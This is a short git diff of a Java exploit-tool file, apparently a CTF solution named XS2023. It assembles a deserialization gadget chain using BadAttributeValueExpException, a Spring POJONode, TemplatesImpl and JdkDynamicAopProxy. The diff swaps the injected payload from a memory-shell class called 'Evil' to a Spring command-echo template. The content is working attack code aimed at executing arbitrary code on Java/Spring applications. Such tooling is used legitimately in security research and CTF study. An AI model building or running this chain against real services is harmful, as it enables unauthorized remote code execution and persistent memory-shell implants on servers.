@@ -2,8 +2,8 @@ package dev.silente.javashark.solution;
 
 import dev.silente.javashark.gadget.jdk.GBadAttributeValueExpException;
 import dev.silente.javashark.gadget.springboot.GPOJONode;
-import dev.silente.javashark.memshell.Evil;
 import dev.silente.javashark.sink.jdk.STemplates;
+import dev.silente.javashark.template.echo.SpringEcho;
 import dev.silente.javashark.utils.MiscUtils;
 import dev.silente.javashark.utils.SerializeUtils;
 import org.springframework.aop.framework.AdvisedSupport;
@@ -16,7 +16,7 @@ import java.lang.reflect.Proxy;
 public class XS2023 {
     public static void main(String[] args) throws Exception {
 
-        Object exp = STemplates.getEvilTemplates(MiscUtils.classAsBytes(Evil.class));
+        Object exp = STemplates.getEvilTemplates(MiscUtils.classAsBytes(SpringEcho.class));
 
         Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
         Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
